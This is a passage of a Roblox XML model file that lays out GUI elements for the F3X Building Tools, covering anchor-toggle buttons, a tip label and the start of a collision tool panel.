											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX1AE0D3B5B2CE4712AF0DB143D6EABFDF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX14DF3155C3F244E1A17CD92BB2AF466B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">ANCHORED</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX6C7B1E7BA0F94790901C773DA69462A5">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Unanchored</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>140</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXC2A301CD785D4D79B3A6D5510CB352BF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>9</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-9</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX8B9A66AE0C6E422D99F5C079E6A2DC8D">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX8293D84A936C40D4A9D3D6FD67FE2D5C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXF3974C39CA1643558ECCC681CB0FA84E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">UNANCHORED</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX7479B435A6D8458E9CB21275D751DCF5">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tip</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXBBB06FF39D8B45B3B1273302D7FE9C9D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXE5A4C1993E684F86B21874985BA07F2F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">TIP: Press Enter to quickly toggle the anchor.</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX2BB72BB6F49A4EB3A5D7A7A55F164AFD">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTCollisionToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX6445B046281C436980994A8C6B613B86">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX12083CE349FD4EBE9747D7B89BAB94D4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXB3E1CCAE941644E89DF03D6FAFE70A2F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">COLLISION TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCC66196242574A0CA35E5B0BADDE883F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX60655E48DD58438CA127629D008110C1">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Status</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXDFB7D8A338774BA4BC0E49A847962D98">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Collision</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX6A996997475443139096343200B55FA6">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">On</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>65</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX44361FFF96F84702A01ABF728B8BF166">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX14C8D9021ABA439892361B46C78051FC">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
